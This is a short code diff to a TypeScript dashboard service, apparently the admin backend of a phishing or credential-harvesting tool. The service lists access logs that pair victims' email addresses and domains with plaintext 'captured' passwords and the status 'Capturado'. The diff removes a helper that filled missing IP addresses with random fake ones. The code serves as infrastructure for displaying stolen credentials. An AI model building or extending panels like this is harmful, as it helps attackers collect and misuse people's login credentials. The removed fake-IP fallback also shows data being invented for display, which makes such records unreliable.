@@ -40,11 +40,6 @@ export class DashboardService {
     };
   }
 
-  private generateRandomIP(): string {
-    const octets = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256));
-    return octets.join('.');
-  }
-
   async getLogs() {
     const logs = await this.accessLogRepository.find({
       order: { createdAt: 'DESC' },
@@ -65,7 +60,7 @@ export class DashboardService {
         email: log.email,
         domain,
         password: log.passwordCaptured || 'Sin contraseña',
-        ipAddress: log.ipAddress || this.generateRandomIP(),
+        ipAddress: log.ipAddress,
         status: 'Capturado',
         createdAt: log.createdAt,
       };
